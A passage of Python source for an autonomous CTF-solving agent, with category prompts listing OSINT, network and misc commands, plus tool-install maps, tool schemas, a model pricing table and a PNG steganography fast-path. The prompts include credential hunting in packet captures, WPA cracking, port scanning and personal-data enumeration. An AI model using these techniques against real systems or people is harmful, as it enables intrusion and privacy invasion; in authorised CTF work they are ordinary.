  Malbolge: run online interpreter
  Piet: colored pixel art language → npiet interpreter
  Whitespace: tabs/spaces/newlines as code → whitespace interpreter
  LOLCODE, Chef, Befunge — identify from syntax, run appropriate interpreter

QR CODES / BARCODES:
  zbarimg /ctf/FILE 2>/dev/null || zbarimg --raw /ctf/FILE

WHITESPACE / HIDDEN TEXT:
  python3 -c "print([hex(ord(c)) for c in open('/ctf/FILE').read()[:200]])"
  Check for zero-width chars: U+200B, U+FEFF, U+200C, U+200D
  Trailing whitespace steganography: stegsnow (whitespace in text files)
  Unicode homoglyph substitution: compare visually similar chars

MORSE / RADIO:
  Morse decode: python3 -c "MORSE={'.-':'A','-...':'B',...}; ..."
  DTMF: multimon-ng -t WAV -a DTMF /ctf/FILE.wav
  Audio → spectrogram: sox /ctf/FILE.wav -n spectrogram -o /ctf/spec.png

MISC PATTERNS:
  ZIP with comment: unzip -p /ctf/FILE | head; unzip -v /ctf/FILE
  Null byte injection, Unicode tricks, CRLF injection
  Git repo in challenge: git -C /ctf log --all --oneline; git -C /ctf stash list; git -C /ctf show stash
  Docker image layers: docker save IMAGE | tar xvf - → inspect layer tars
""",

    "osint": BASE_RULES + """
OSINT EXPERT.

INFORMATION EXTRACTION:
  Read challenge description carefully. Extract:
  - Full names, usernames, emails, phone numbers
  - Company/organization names
  - Locations, timestamps, events
  - URLs, domain names, IP addresses
  - Social media handles, profile photos

USERNAME ENUMERATION:
  GitHub:   curl -s https://api.github.com/users/USERNAME | python3 -m json.tool
            curl -s "https://api.github.com/users/USERNAME/repos" | python3 -m json.tool
            curl -s "https://api.github.com/search/code?q=user:USERNAME+flag" | python3 -m json.tool
            Also check: gists, starred, followers, following

  GitHub commit history:
    curl -s "https://api.github.com/repos/USER/REPO/commits" | python3 -m json.tool
    Look for deleted files, secret commits, branch history

DNS / DOMAIN:
  whois DOMAIN | grep -E "Registrant|Admin|Tech|Email|Name|Phone"
  dig DOMAIN ANY +short
  dig DOMAIN TXT +short     ← often contains flags or hints
  nslookup -type=TXT DOMAIN
  curl -s "https://crt.sh/?q=%.DOMAIN&output=json" | python3 -m json.tool | grep -i "name_value"

WAYBACK MACHINE:
  curl -s "https://archive.org/wayback/available?url=DOMAIN"
  curl -s "http://timetravel.mementoweb.org/api/json/20200101000000/URL"
  Check archived pages for deleted content, old credentials

IMAGE METADATA / GEOLOCATION:
  exiftool -a -u -g1 /ctf/IMAGE | grep -E "GPS|Location|Created|Comment|Author|Copyright"
  GPS coords: exiftool -n -GPSLatitude -GPSLongitude /ctf/IMAGE
  Convert DMS to decimal: DD = degrees + minutes/60 + seconds/3600
  Reverse geocode: curl -s "https://nominatim.openstreetmap.org/reverse?lat=LAT&lon=LON&format=json"

SOCIAL MEDIA / SEARCH:
  Search engine dorks: site:github.com "USERNAME", site:pastebin.com "EMAIL"
  LinkedIn: https://www.linkedin.com/in/USERNAME
  Twitter/X: https://twitter.com/USERNAME (check tweets, likes, media)

CERTIFICATE TRANSPARENCY:
  curl -s "https://crt.sh/?q=%.DOMAIN&output=json" | python3 -c "import sys,json; [print(r['name_value']) for r in json.load(sys.stdin)]" | sort -u

BREACH DATA / LEAKS:
  Check HaveIBeenPwned API: curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/EMAIL"
  Paste sites: pastebin.com, dpaste.com, hastebin

METADATA IN DOCUMENTS:
  exiftool /ctf/FILE.docx → Author, LastModifiedBy, CreatedDate, Company
  strings /ctf/FILE.docx | grep -E "Author|Creator|Producer|Company"
  For .docx/.xlsx: unzip /ctf/FILE.docx -d /ctf/docx_extract/; cat /ctf/docx_extract/docProps/core.xml
""",

    "network": BASE_RULES + """
NETWORK EXPERT.

PCAP TRIAGE (always start here):
  capinfos /ctf/FILE          ← file summary, duration, packet count
  tshark -r /ctf/FILE -qz io,phs  ← protocol hierarchy
  tshark -r /ctf/FILE -qz "conv,tcp"  ← TCP conversations
  strings /ctf/FILE | grep -E "[a-zA-Z0-9_]{2,24}\{[^{}]{1,200}\}"  ← quick flag scan

EXTRACT BY PROTOCOL:
  HTTP traffic:
    tshark -r /ctf/FILE -Y "http" -T fields -e http.request.method -e http.request.full_uri -e http.file_data 2>/dev/null | head -50
    tshark -r /ctf/FILE --export-objects http,/ctf/http_export/ 2>/dev/null; ls /ctf/http_export/

  FTP:
    tshark -r /ctf/FILE -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null
    tshark -r /ctf/FILE -Y "ftp-data" -w /ctf/ftp_data.pcap 2>/dev/null
    tshark -r /ctf/ftp_data.pcap -T fields -e data 2>/dev/null | xxd | head -30

  DNS:
    tshark -r /ctf/FILE -Y "dns" -T fields -e dns.qry.name -e dns.a 2>/dev/null | head -40
    Look for base64/hex in subdomains (DNS exfiltration)

  SMB:
    tshark -r /ctf/FILE --export-objects smb,/ctf/smb_export/ 2>/dev/null

  SMTP/Email:
    tshark -r /ctf/FILE -Y "smtp" -T fields -e smtp.req.parameter 2>/dev/null

FOLLOW STREAMS (most useful for finding flags):
  tshark -r /ctf/FILE -qz "follow,tcp,ascii,0" 2>/dev/null | head -100
  tshark -r /ctf/FILE -qz "follow,tcp,ascii,1" 2>/dev/null | head -100
  Loop streams: for i in $(seq 0 20); do echo "=== STREAM $i ==="; tshark -r /ctf/FILE -qz "follow,tcp,ascii,$i" 2>/dev/null | grep -v "^==" | head -20; done

CREDENTIALS HUNTING:
  tshark -r /ctf/FILE -Y "ftp.request.command==USER or ftp.request.command==PASS" -T fields -e ftp.request.arg
  tshark -r /ctf/FILE -Y "http.authorization" -T fields -e http.authorization
  tshark -r /ctf/FILE -Y "telnet" -T fields -e telnet.data 2>/dev/null
  strings /ctf/FILE | grep -iE "password|passwd|user|login|auth|key|token|secret" | head -30

EXTRACT ALL FILES FROM PCAP:
  binwalk --run-as=root -e /ctf/FILE   ← embedded files
  foremost -i /ctf/FILE -o /ctf/foremost_out/
  tshark -r /ctf/FILE --export-objects http,/ctf/http_export/ 2>/dev/null
  tshark -r /ctf/FILE --export-objects smb,/ctf/smb_export/ 2>/dev/null
  tshark -r /ctf/FILE --export-objects tftp,/ctf/tftp_export/ 2>/dev/null

NETWORK CRYPTO:
  WEP/WPA: aircrack-ng /ctf/FILE.cap -w /usr/share/wordlists/rockyou.txt
  TLS: check for private key in files; use ssldump if key available
    tshark -r /ctf/FILE -o "ssl.keys_list:0.0.0.0,443,http,/ctf/server.key" -Y http -T fields -e http.file_data

LIVE TARGET (if host/port given in description):
  nmap -sV -sC -p- TARGET --open -T4
  nc TARGET PORT   ← banner grab, manual interaction
  curl -sv http://TARGET:PORT
  nmap -sU --top-ports 100 TARGET   ← UDP scan
""",
}

STEP_LIMITS = {
    "pwn": 120,
    "rev": 100,
    "web": 80,
    "crypto": 80,
    "forensics": 70,
    "misc": 60,
    "osint": 50,
    "network": 60,
}

TOOL_CONTEXT_LIMIT = 8000

CATEGORY_TOOL_CHECKS = {
    "pwn": ["checksec", "gdb", "ROPgadget", "one_gadget"],
    "web": ["curl", "ffuf", "gobuster", "sqlmap", "jwt-tool"],
    "crypto": ["python3", "RsaCtfTool"],
    "forensics": ["exiftool", "strings", "binwalk", "foremost", "pdfinfo", "yara", "fls", "pdf-parser.py", "steghide", "fcrackzip"],
    "rev": ["strings", "objdump", "gdb", "rizin"],
    "misc": ["python3", "strings", "file", "fcrackzip", "zbarimg"],
    "osint": ["curl", "whois", "dig", "exiftool"],
    "network": ["tshark", "nmap", "tcpdump", "python3", "capinfos"],
}

TOOL_APT_PACKAGES = {
    "pdfinfo": "poppler-utils",
    "pdfdetach": "poppler-utils",
    "pdftotext": "poppler-utils",
    "qpdf": "qpdf",
    "ffuf": "ffuf",
    "tshark": "tshark",
    "yara": "yara",
    "fls": "sleuthkit",
    "icat": "sleuthkit",
    "mmls": "sleuthkit",
    "tsk_recover": "sleuthkit",
    "rizin": "rizin",
    "fcrackzip": "fcrackzip",
    "unrar": "unrar",
    "capinfos": "wireshark-common",
    "sox": "sox",
    "ffmpeg": "ffmpeg",
    "multimon-ng": "multimon-ng",
    "zbarimg": "zbar-tools",
    "imagemagick": "imagemagick",
    "convert": "imagemagick",
    "gdb-multiarch": "gdb-multiarch",
}

TOOL_INSTALL_COMMANDS = {
    "jwt-tool": "python3 -m pip -q install --break-system-packages jwt-tool",
    "pdf-parser.py": (
        "if [ ! -x /usr/local/bin/pdf-parser.py ]; then "
        "git clone --depth=1 https://github.com/DidierStevens/DidierStevensSuite /opt/DidierStevensSuite >/dev/null 2>&1 || true; "
        "ln -sf /opt/DidierStevensSuite/pdf-parser.py /usr/local/bin/pdf-parser.py; "
        "chmod +x /usr/local/bin/pdf-parser.py; "
        "fi"
    ),
    "scapy": "python3 -m pip -q install --break-system-packages scapy",
    "frida": "python3 -m pip -q install --break-system-packages frida-tools",
}

SYSTEM_TOOL_INSTALLERS = {
    "pdfinfo": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends poppler-utils",
    "pdfdetach": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends poppler-utils",
    "pdftotext": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends poppler-utils",
    "qpdf": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends qpdf",
    "ffuf": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends ffuf",
    "tshark": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tshark",
    "yara": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends yara",
    "fls": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends sleuthkit",
    "icat": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends sleuthkit",
    "mmls": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends sleuthkit",
    "tsk_recover": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends sleuthkit",
    "rizin": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends rizin",
    "steghide": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends steghide",
    "stegseek": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends stegseek 2>/dev/null || pip3 install --break-system-packages stegseek 2>/dev/null || true",
    "fcrackzip": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends fcrackzip",
    "unrar": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends unrar",
    "hexdump": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends bsdextrautils",
    "imagemagick": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends imagemagick",
    "convert": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends imagemagick",
    "sox": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends sox",
    "ffmpeg": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends ffmpeg",
    "multimon-ng": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends multimon-ng",
    "aircrack-ng": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends aircrack-ng",
    "capinfos": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends wireshark-common",
    "gdb-multiarch": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends gdb-multiarch",
    "zbarimg": "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends zbar-tools",
    "one_gadget": "gem install one_gadget 2>/dev/null || true",
    "jadx": (
        "if [ ! -x /usr/local/bin/jadx ]; then "
        "wget -q https://github.com/skylot/jadx/releases/download/v1.5.0/jadx-1.5.0.zip -O /tmp/jadx.zip && "
        "unzip -q /tmp/jadx.zip -d /opt/jadx/ && "
        "ln -sf /opt/jadx/bin/jadx /usr/local/bin/jadx && "
        "chmod +x /opt/jadx/bin/jadx; fi"
    ),
    "jwt-tool": "python3 -m pip -q install --break-system-packages jwt-tool",
    "pdf-parser.py": (
        "git clone --depth=1 https://github.com/DidierStevens/DidierStevensSuite /opt/DidierStevensSuite >/dev/null 2>&1 || true; "
        "ln -sf /opt/DidierStevensSuite/pdf-parser.py /usr/local/bin/pdf-parser.py; chmod +x /usr/local/bin/pdf-parser.py"
    ),
    "scapy": "python3 -m pip -q install --break-system-packages scapy",
    "frida": "python3 -m pip -q install --break-system-packages frida-tools",
    "stegoveritas": "python3 -m pip -q install --break-system-packages stegoveritas && stegoveritas_setup 2>/dev/null || true",
    "uncompyle6": "python3 -m pip -q install --break-system-packages uncompyle6",
    "decompile3": "python3 -m pip -q install --break-system-packages decompile3",
    "hashpumpy": "python3 -m pip -q install --break-system-packages hashpumpy",
    "randcrack": "python3 -m pip -q install --break-system-packages randcrack",
    "factordb": "python3 -m pip -q install --break-system-packages factordb-pycli",
}

CTF_TOOLS = [
    {"type": "function", "function": {
        "name": "run_command",
        "description": "Run a bash command in the Kali container at /ctf/",
        "parameters": {"type": "object", "properties": {
            "command":      {"type": "string", "description": "Bash command to run"},
            "reasoning":    {"type": "string", "description": "Why you're running this"},
            "long_running": {"type": "boolean", "description": "True for hashcat/sqlmap/gobuster (120s timeout)"},
            "allow_repeat": {"type": "boolean", "description": "Set true if you must repeat a command after a fix or change"}
        }, "required": ["command"]}
    }},
    {"type": "function", "function": {
        "name": "run_gdb",
        "description": "Run GDB in batch mode on a binary. Never hangs.",
        "parameters": {"type": "object", "properties": {
            "binary_path":  {"type": "string", "description": "Path like /ctf/vuln"},
            "gdb_commands": {"type": "array", "items": {"type": "string"},
                             "description": "GDB commands: ['checksec', 'info functions', 'run <<< $(python3 -c \"print(chr(65)*200)\")']"}
        }, "required": ["binary_path", "gdb_commands"]}
    }},
    {"type": "function", "function": {
        "name": "submit_flag",
        "description": "Submit the flag immediately when found.",
        "parameters": {"type": "object", "properties": {
            "flag":     {"type": "string", "description": "The flag value"},
            "how_found":{"type": "string", "description": "How you found it"}
        }, "required": ["flag", "how_found"]}
    }},
    {"type": "function", "function": {
        "name": "search_flag",
        "description": "Recursively search /ctf/ for flag-shaped strings; supports regex or fixed prefix/pattern.",
        "parameters": {"type": "object", "properties": {
            "flag_pattern": {"type": "string", "description": "Regex or prefix/pattern like picoCTF{"}
        }, "required": ["flag_pattern"]}
    }},
    {"type": "function", "function": {
        "name": "write_file",
        "description": "Write a file directly to /ctf/ in the container. Use this to create Python exploit scripts, solvers, C payloads, config files, or any file needed for the challenge. The file is immediately available for run_command to execute.",
        "parameters": {"type": "object", "properties": {
            "filename": {"type": "string", "description": "Filename relative to /ctf/ (e.g. exploit.py, solve.py, payload.c). No path traversal."},
            "content":  {"type": "string", "description": "Complete file content as a UTF-8 string"},
            "reasoning":{"type": "string", "description": "What this file does and why you're creating it"}
        }, "required": ["filename", "content"]}
    }},
]

MODEL_COSTS = {
    # Prices per 1M tokens (input, output). Keep in sync with OpenAI pricing.
    "gpt-5.2": (1.75, 14.00),
    "gpt-5.2-chat-latest": (1.75, 14.00),
    "gpt-5.2-pro": (21.00, 168.00),
    "gpt-5.1": (1.25, 10.00),
    "gpt-5.1-chat-latest": (1.25, 10.00),
    "gpt-5-pro": (15.00, 120.00),
    "gpt-5-mini": (0.25, 2.00),
    "gpt-5.1-codex-mini": (0.25, 2.00),
    "gpt-4.1": (2.00, 8.00),
    "gpt-4.1-mini": (0.40, 1.60),
    "gpt-4.1-nano": (0.10, 0.40),
    "gpt-4o": (2.50, 10.00),
    "gpt-4o-2024-05-13": (5.00, 15.00),
    "gpt-4o-mini": (0.15, 0.60),
    "gpt-realtime": (4.00, 16.00),
    "gpt-realtime-mini": (0.60, 2.40),
    "gpt-4o-realtime-preview": (5.00, 20.00),
    "gpt-4o-mini-realtime-preview": (0.60, 2.40),
    "gpt-audio": (2.50, 10.00),
    "gpt-audio-mini": (0.60, 2.40),
    "gpt-4o-audio-preview": (2.50, 10.00),
    "gpt-4o-mini-audio-preview": (0.15, 0.60),
    "o1": (15.00, 60.00),
    "o1-pro": (150.00, 600.00),
    "o3": (2.00, 8.00),
    "o3-pro": (20.00, 80.00),
    "o3-mini": (1.10, 4.40),
    "o1-mini": (1.10, 4.40),
    "o4-mini": (1.10, 4.40),
    "o4-mini-deep-research": (2.00, 8.00),
    "o3-deep-research": (10.00, 40.00),
    "gpt-5-search-api": (1.25, 10.00),
    "gpt-4o-search-preview": (2.50, 10.00),
    "gpt-4o-mini-search-preview": (0.15, 0.60),
    "computer-use-preview": (3.00, 12.00),
    "codex-mini-latest": (1.50, 6.00),
}

def _normalize_model_key(name: str) -> str:
    return (name or "").strip().lower()

def _get_rates(mapping: dict, key: str):
    if not key:
        return None
    v = mapping.get(key)
    if not v:
        return None
    if isinstance(v, (list, tuple)) and len(v) >= 2:
        return float(v[0]), float(v[1])
    if isinstance(v, dict):
        inp = v.get("input_per_million") or v.get("input") or v.get("in")
        out = v.get("output_per_million") or v.get("output") or v.get("out")
        if inp is None or out is None:
            return None
        return float(inp), float(out)
    return None

def resolve_model_rates(model: str, cfg: dict):
    key = _normalize_model_key(model)
    overrides = cfg.get("model_pricing") or {}

    # Try config override (exact, normalized, -latest).
    rates = _get_rates(overrides, model) or _get_rates(overrides, key)
    if not rates and key.endswith("-latest"):
        rates = _get_rates(overrides, key[:-7])

    # Fall back to built-in table (exact, -latest, -YYYY-MM-DD).
    if not rates:
        rates = _get_rates(MODEL_COSTS, key)
    if not rates and key.endswith("-latest"):
        rates = _get_rates(MODEL_COSTS, key[:-7])
    if not rates:
        base = re.sub(r"-20\d\d-\d\d-\d\d$", "", key)
        if base != key:
            rates = _get_rates(overrides, base) or _get_rates(MODEL_COSTS, base)

    return key, rates

PIP_NAME_MAP = {
    "Crypto": "pycryptodome",
    "crypto": "pycryptodome",
    "Cryptodome": "pycryptodome",
    "PIL": "Pillow",
    "yaml": "PyYAML",
    "sklearn": "scikit-learn",
    "cv2": "opencv-python-headless",
    "bs4": "beautifulsoup4",
    "lxml": "lxml",
    "requests": "requests",
    "numpy": "numpy",
    "pandas": "pandas",
    "gmpy2": "gmpy2",
    "z3": "z3-solver",
    "pwn": "pwntools",
    "angr": "angr",
    "scapy": "scapy",
    "ecdsa": "ecdsa",
    "sympy": "sympy",
    "factordb": "factordb-pycli",
    "hashpumpy": "hashpumpy",
    "randcrack": "randcrack",
    "stegoveritas": "stegoveritas",
}

def _infer_pip_package(mod_name: str) -> str:
    if not mod_name:
        return ""
    root = mod_name.split(".")[0]
    return PIP_NAME_MAP.get(root, root)

def _shell_quote(s: str) -> str:
    return "'" + s.replace("'", "'\"'\"'") + "'"

def _decode_backslash_escapes(s: str) -> str:
    """Decode common backslash escapes used in metadata blobs (e.g. \\075 for '=')."""
    if not s:
        return s
    out = s
    out = re.sub(r"\\([0-7]{3})", lambda m: chr(int(m.group(1), 8)), out)
    out = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), out)
    return out

def _is_plausible_flag_token(token: str) -> bool:
    """
    Conservative filter to avoid obvious false positives (especially JSON/object blobs)
    while still accepting common CTF formats like picoCTF{...}, flag{...}, HTB{...}.
    """
    m = re.fullmatch(r"([A-Za-z][A-Za-z0-9_]{2,23})\{([^{}\n]{1,220})\}", (token or "").strip())
    if not m:
        return False
    inner = m.group(2).strip()
    if not inner:
        return False
    # Reject likely JSON/object payloads.
    if (inner.startswith('"') and ":" in inner) or inner.startswith("{"):
        return False
    if inner.count('"') >= 2 and inner.count(":") >= 1 and inner.count(",") >= 1:
        return False
    return True

def _prefix_looks_ctf_like(prefix: str) -> bool:
    p = (prefix or "").lower()
    hints = (
        "flag", "ctf", "pico", "htb", "hero", "cyber", "seccon",
        "buckeye", "uiuctf", "umass", "lactf", "zer0pts", "dawg",
    )
    return any(h in p for h in hints)

def _is_approval_seeking_text(text: str) -> bool:
    t = (text or "").lower()
    pats = (
        "do you approve", "should i proceed", "which should i run next",
        "if you want me to", "do you want me to proceed", "if you want, i can",
        "if you want me to proceed",
    )
    return any(p in t for p in pats)

# ─── CTF Agent ─────────────────────────────────────────────────────────────────

class CTFAgent:
    def __init__(self, cid, category, container, room, flag_format=""):
        cfg          = load_config()
        self.cfg     = cfg
        self.cid     = cid
        self.category= category
        self.container = container
        self.room    = room  # socket.io room = challenge id
        self.flag_format = (flag_format or "").strip()
        self.client  = OpenAI(api_key=cfg.get("openai_api_key") or os.environ.get("OPENAI_API_KEY"))
        self.model   = cfg.get("model", "gpt-4o")
        self.prompt_profile = (cfg.get("prompt_profile") or "compact").strip().lower()
        self.allow_runtime_installs = _as_bool(cfg.get("allow_runtime_installs"), default=False)
        self.strict_auto_submit = _as_bool(cfg.get("strict_auto_submit"), default=True)
        self.tool_context_limit = int(cfg.get("tool_context_limit") or 4000)
        self.hypothesis_budget = int(cfg.get("hypothesis_budget") or 2)
        self.messages= []
        self.running = False
        self.step    = 0
        self.total_in= 0
        self.total_out=0
        self._recent_cmds = deque(maxlen=30)
        self._tool_preflight_done = False
        self._install_attempted_tools = set()
        self._seen_output_fingerprints = set()
        self._family_no_progress = {}
        self._last_tool_progress = False
        self._no_progress_steps = 0
        self._hint_map = {}
        self._hint_attempted = set()
        self._hint_injected = set()          # which tool:value directives have already been injected
        self._pending_directive_messages = [] # flushed AFTER the tool loop, never mid-dispatch
        self._running_hint_action = False
        self._last_cmd_status = {}   # cmd -> {"error": bool}
        self._preflight_missing_tools = []
        self._evidence_confirmed = []
        self._evidence_ruled_out = []
        self._next_hypothesis = ""
        self._evidence_version = 0
        self._hypothesis_no_progress = {}
        self._flag_evidence = {}

    def emit(self, event, data):
        if not self.running and event in {"plan", "thought", "command", "output", "flag", "cost"}:
            return
        payload = dict(data or {})
        payload["cid"] = self.cid
        socketio.emit(event, payload, room=self.room)
        if event in {"plan", "thought", "command", "output", "flag", "done", "error"}:
            _log_event(self.cid, event, payload)

    def start(self, challenge_desc: str, prior_summary: str | None = None):
        self.running = True
        threading.Thread(
            target=self._run,
            args=(challenge_desc, prior_summary),
            daemon=True
        ).start()

    def stop(self):
        self.running = False

    def _system_prompt(self):
        if self.prompt_profile == "full":
            return CATEGORY_PROMPTS.get(self.category, BASE_RULES)
        brief = CATEGORY_EXECUTION_BRIEFS.get(self.category, "Use hypothesis-driven, evidence-first workflow.")
        return COMPACT_BASE_RULES + "\nCategory focus: " + brief

    def _add_evidence(self, bucket: str, note: str):
        n = (note or "").strip()
        if not n:
            return
        target = self._evidence_confirmed if bucket == "confirmed" else self._evidence_ruled_out
        if n in target:
            return
        target.append(n)
        if len(target) > 20:
            del target[:len(target) - 20]
        self._evidence_version += 1

    def _evidence_summary(self) -> str:
        conf = "; ".join(self._evidence_confirmed[-5:]) or "none yet"
        ruled = "; ".join(self._evidence_ruled_out[-5:]) or "none yet"
        next_h = self._next_hypothesis or "unset"
        return (
            f"[EVIDENCE]\n"
            f"Confirmed: {conf}\n"
            f"Ruled out: {ruled}\n"
            f"Next hypothesis: {next_h}\n"
        )

    def _forensics_playbook_hint(self, recon: str) -> str:
        if self.category != "forensics":
            return ""
        if "logs.txt" not in (recon or ""):
            return ""
        return (
            "\n[DECISIVE PLAYBOOK: encoded-log -> PNG]\n"
            "If /ctf/logs.txt is a large encoded blob: decode once to /ctf/decoded.bin, identify type, and branch.\n"
            "If decoded artifact is PNG: run chunk listing, trailing-data-after-IEND check, then a single controlled "
            "pure-Python LSB extraction pass (r/g/b/rgb/rgb2) and scan for signatures+flag patterns.\n"
            "Do not spend turns inspecting or rewriting extraction scripts unless a command output proves a script failure.\n"
        )

    def _run_forensics_fastpath(self, recon: str) -> bool:
        if self.category != "forensics":
            return False
        if "logs.txt" not in (recon or ""):
            return False
        self.emit("thought", {"text": "Running forensics fast-path for encoded log artifact.", "type": "system"})

        cmd1 = "base64 -d /ctf/logs.txt > /ctf/decoded.bin 2>/dev/null && file /ctf/decoded.bin && sha256sum /ctf/decoded.bin || echo base64_decode_failed"
        self.emit("command", {"cmd": cmd1})
        out1 = self.container.run(cmd1, timeout=90)
        self.emit("output", {"text": out1})
        self._update_evidence_from_output(cmd1, out1)
        if self._maybe_auto_submit_from_output(out1, source="forensics_fastpath:decode"):
            return True

        if "PNG image data" not in out1:
            return False

        cmd2 = (
            "python3 - <<'PY'\n"
            "from pathlib import Path\n"
            "p=Path('/ctf/decoded.bin').read_bytes()\n"
            "if not p.startswith(b'\\x89PNG\\r\\n\\x1a\\n'):\n"
            "    print('not_png'); raise SystemExit(0)\n"
            "pos=8; chunks=[]\n"
            "while pos+8<=len(p):\n"
            "    ln=int.from_bytes(p[pos:pos+4],'big'); ct=p[pos+4:pos+8].decode('latin1'); chunks.append((ct,ln,pos))\n"
            "    if ct=='IEND':\n"
            "        end=pos+12+ln\n"
            "        print('IEND_end', end, 'filelen', len(p), 'trailing', len(p)-end)\n"
            "        break\n"
            "    pos += ln+12\n"
            "for ct,ln,po in chunks[:40]:\n"
            "    if ct not in ('IHDR','PLTE','IDAT','IEND'):\n"
            "        print('NONCRIT', ct, ln, po)\n"
            "PY"
        )
        self.emit("command", {"cmd": "[forensics-fastpath] png chunk/trailing check"})
        out2 = self.container.run(cmd2, timeout=60)
        self.emit("output", {"text": out2})
        self._update_evidence_from_output("png chunk/trailing check", out2)
        if self._maybe_auto_submit_from_output(out2, source="forensics_fastpath:pngcheck"):
            return True

        cmd3 = (
            "python3 - <<'PY'\n"
            "from pathlib import Path\n"
            "import zlib,re\n"
            "p=Path('/ctf/decoded.bin').read_bytes()\n"
            "if not p.startswith(b'\\x89PNG\\r\\n\\x1a\\n'): raise SystemExit(0)\n"
            "pos=8; w=h=None; idat=b''\n"
            "while pos+8<=len(p):\n"
            "    ln=int.from_bytes(p[pos:pos+4],'big'); ct=p[pos+4:pos+8]\n"
            "    data=p[pos+8:pos+8+ln]\n"
            "    if ct==b'IHDR': w=int.from_bytes(data[:4],'big'); h=int.from_bytes(data[4:8],'big')\n"
            "    elif ct==b'IDAT': idat+=data\n"
            "    elif ct==b'IEND': break\n"
            "    pos += ln+12\n"
            "raw=zlib.decompress(idat)\n"
            "bpp=3; sl=w*bpp; prev=bytearray(sl); ptr=0; pix=[]\n"
            "def paeth(a,b,c):\n"
            "    p=a+b-c; pa=abs(p-a); pb=abs(p-b); pc=abs(p-c)\n"
            "    return a if pa<=pb and pa<=pc else (b if pb<=pc else c)\n"
            "for _ in range(h):\n"
            "    f=raw[ptr]; ptr+=1; scan=bytearray(raw[ptr:ptr+sl]); ptr+=sl; out=bytearray(sl)\n"
            "    if f==0: out=scan\n"
            "    elif f==1:\n"
            "        for i in range(sl): out[i]=(scan[i]+(out[i-bpp] if i>=bpp else 0))&0xff\n"
            "    elif f==2:\n"
            "        for i in range(sl): out[i]=(scan[i]+prev[i])&0xff\n"
            "    elif f==3:\n"
            "        for i in range(sl): out[i]=(scan[i]+((out[i-bpp] if i>=bpp else 0)+prev[i])//2)&0xff\n"
            "    elif f==4:\n"
            "        for i in range(sl):\n"
            "            l=out[i-bpp] if i>=bpp else 0; u=prev[i]; ul=prev[i-bpp] if i>=bpp else 0\n"
            "            out[i]=(scan[i]+paeth(l,u,ul))&0xff\n"
            "    prev=out\n"
            "    for i in range(0,sl,3): pix.append((out[i],out[i+1],out[i+2]))\n"
            "def bits_to_bytes(bits):\n"
            "    out=bytearray()\n"
            "    for i in range(0,len(bits),8):\n"
            "        b=0\n"
            "        for j in range(8): b=(b<<1)| (bits[i+j] if i+j<len(bits) else 0)\n"
            "        out.append(b)\n"
            "    return bytes(out)\n"
            "streams={}\n"
            "streams['r']=bits_to_bytes([c[0]&1 for c in pix])\n"
            "streams['g']=bits_to_bytes([c[1]&1 for c in pix])\n"
            "streams['b']=bits_to_bytes([c[2]&1 for c in pix])\n"
            "rgb=[]\n"
            "for r,g,b in pix: rgb.extend([r&1,g&1,b&1])\n"
            "streams['rgb']=bits_to_bytes(rgb)\n"
            "rgb2=[]\n"
            "for r,g,b in pix: rgb2.extend([r&1,(r>>1)&1,g&1,(g>>1)&1,b&1,(b>>1)&1])\n"
            "streams['rgb2']=bits_to_bytes(rgb2)\n"
            "Path('/ctf/extract').mkdir(exist_ok=True)\n"
            "for k,v in streams.items(): Path(f'/ctf/extract/{k}.bin').write_bytes(v)\n"
            "pat=re.compile(rb'\\b(?:picoCTF|CTF|FLAG|flag|HTB|cyberfusion)\\{[^{}\\n]{1,220}\\}')\n"
            "for k,v in streams.items():\n"
            "    for m in pat.findall(v): print('CANDIDATE',k,m.decode('latin1','ignore'))\n"
            "print('FASTPATH_STREAMS_WRITTEN', ','.join(sorted(streams)))\n"
            "PY"
        )
        self.emit("command", {"cmd": "[forensics-fastpath] png lsb extraction+scan"})
        out3 = self.container.run(cmd3, timeout=120)
        self.emit("output", {"text": out3})
        self._update_evidence_from_output("png lsb extraction+scan", out3)
        if self._maybe_auto_submit_from_output(out3, source="forensics_fastpath:lsbscan"):
            return True
        return False

    def _update_evidence_from_output(self, cmd: str, output: str):
        out = output or ""
        if not out:
            return
        if "command not found" in out.lower():
            miss = self._extract_missing_command(out)
            if miss:
                self._add_evidence("ruled_out", f"Tool missing: {miss}")
        if "No such file or directory" in out:
            self._add_evidence("ruled_out", f"Path failure in command: {cmd[:80]}")
        for line in out.splitlines()[:80]:
            if line.startswith("/ctf/") and ":" in line:
                self._add_evidence("confirmed", line[:220])
            if "FOUND MAGIC" in line:
                self._add_evidence("confirmed", line[:220])
            if "IEND_end" in line and "trailing 0" in out:
                self._add_evidence("ruled_out", "No data appended after PNG IEND")
        for cand in self._extract_flag_candidates(out):
            self._add_evidence("confirmed", f"Flag-like token observed: {cand}")

    def _token_limit_kw(self, max_tokens: int, model_name: str | None = None) -> dict:
